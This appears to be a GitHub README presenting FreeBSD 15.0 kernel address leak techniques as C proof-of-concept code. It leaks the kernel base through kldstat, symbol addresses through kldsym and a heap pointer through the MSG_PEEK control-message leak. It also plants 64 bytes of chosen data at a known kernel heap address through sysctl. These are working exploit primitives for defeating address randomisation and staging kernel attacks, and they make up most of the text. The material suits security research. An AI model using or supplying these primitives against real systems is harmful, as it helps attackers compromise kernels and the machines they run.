# FreeBSD Kernel Address Leaks

introducing known kernel address leak techniques in FreeBSD.

## PoC

[](https://github.com/Yayoi-cs/FreeBSD_Kernel_VA_Leaks)

- `kbase.c`: leak kernel base address using `kldstat`
- `ksym.c`: leak kernel symbol address using `kldsym`
- `msg_peek.c`: leak kernel heap address using `msg_peek`
- `plant_512.c`: 64bytes arbitrary content write on kernel heap + returning fixed address

tested on official VM image 15.0

### kernel base

```c
#include <sys/linker.h>

static unsigned long kernel_base(void) {
    struct kld_file_stat st;
    memset(&st, 0, sizeof(st));
    st.version = sizeof(st);
    if (kldstat(1, &st) < 0) return 0;
    return (unsigned long)st.address;
}
```

### kernel symbol

```c
#include <sys/linker.h>

static unsigned long ksym(const char *name) {
    struct kld_sym_lookup ksl;

    memset(&ksl, 0, sizeof(ksl));
    ksl.version = sizeof(ksl);
    ksl.symname = (char *)name;
    if (kldsym(0, KLDSYM_LOOKUP, &ksl) < 0) return 0;
    return (unsigned long)ksl.symvalue;
}
```

### msg peek

[](https://elixir.bootlin.com/freebsd/v15.0/source/sys/kern/uipc_usrreq.c#L1612)

```plain text
	/*
	 * XXXGL
	 *
	 * In MSG_PEEK case control is not externalized.  This
	 * means we are leaking some kernel pointers to the
	 * userland.  They are useless to a law-abiding
	 * application, but may be useful to a malware.  This
	 * is what the historical implementation in the
	 * soreceive_generic() did. To be improved?
	 */
```

```c
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

#define COLOR_RESET   "\033[0m"
#define COLOR_RED     "\033[0;31m"
#define COLOR_GREEN   "\033[0;32m"
#define COLOR_YELLOW  "\033[0;33m"
#define COLOR_BLUE    "\033[0;34m"
#define COLOR_MAGENTA "\033[0;35m"
#define COLOR_CYAN    "\033[0;36m"
#define hl(x) printf(COLOR_MAGENTA "[#] " #x "=0x%lx\n" COLOR_RESET ,(unsigned long)x);

int main(void) {
        int sv[2];
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) { perror("socketpair"); return 1; }

        int carry = open("/dev/null", O_RDONLY);
        if (carry < 0) { perror("open /dev/null"); return 1; }

        char data = 'X';
        char sndcbuf[CMSG_SPACE(sizeof(int))];
        struct iovec siov = { .iov_base = &data, .iov_len = 1 };
        struct msghdr smsg = {
                .msg_iov = &siov, .msg_iovlen = 1,
                .msg_control = sndcbuf, .msg_controllen = sizeof(sndcbuf),
        };
        struct cmsghdr *scmsg = CMSG_FIRSTHDR(&smsg);
        scmsg->cmsg_level = SOL_SOCKET;
        scmsg->cmsg_type = SCM_RIGHTS;
        scmsg->cmsg_len = CMSG_LEN(sizeof(int));
        memcpy(CMSG_DATA(scmsg), &carry, sizeof(int));

        if (sendmsg(sv[0], &smsg, 0) < 0) { perror("sendmsg"); return 1; }

        char rdata = 0;
        char rcbuf[256];
        struct iovec riov = { .iov_base = &rdata, .iov_len = 1 };
        struct msghdr rmsg = {
                .msg_iov = &riov, .msg_iovlen = 1,
                .msg_control = rcbuf, .msg_controllen = sizeof(rcbuf),
        };
        if (recvmsg(sv[1], &rmsg, MSG_PEEK) < 0) { perror("recvmsg PEEK"); return 1; }

        struct cmsghdr *rcmsg = CMSG_FIRSTHDR(&rmsg);
        if (rcmsg == NULL) { printf("no cmsg returned\n"); goto cleanup; }

        unsigned char *p = CMSG_DATA(rcmsg);
        unsigned long leak;
        memcpy(&leak, p, 8);

        hl(leak);

cleanup:
        close(carry);
        close(sv[0]);
        close(sv[1]);
        return 0;
}
```

### kern_info

```c

#define PARGS_DATA_OFF 8
void plant_512(const void *bytes, unsigned long *plant_va) {
    int mib_w[4] = { CTL_KERN, KERN_PROC, KERN_PROC_ARGS, getpid() };
    SYSCHK(sysctl(mib_w, 4, NULL, NULL, bytes, 64));

    int mib_r[4] = { CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid() };
    struct kinfo_proc kp;
    size_t len = sizeof kp;
    SYSCHK(sysctl(mib_r, 4, &kp, &len, NULL, 0));

    *plant_va = (unsigned long)kp.ki_args + PARGS_DATA_OFF;
}

int main(void) {
    unsigned long plant_va;
    unsigned long payload[8];
    payload[0] = 0xdeadbeaf00000000;
    payload[1] = 0xdeadbeaf00000001;
    payload[2] = 0xdeadbeaf00000002;
    payload[3] = 0xdeadbeaf00000003;
    payload[4] = 0xabad1dea00000000;
    payload[5] = 0xabad1dea00000001;
    payload[6] = 0xabad1dea00000002;
    payload[7] = 0xabad1dea00000003;
    xxd_qword(payload,64);
    plant_512(payload, &plant_va);
    hl(plant_va);

    return 0;
}
```
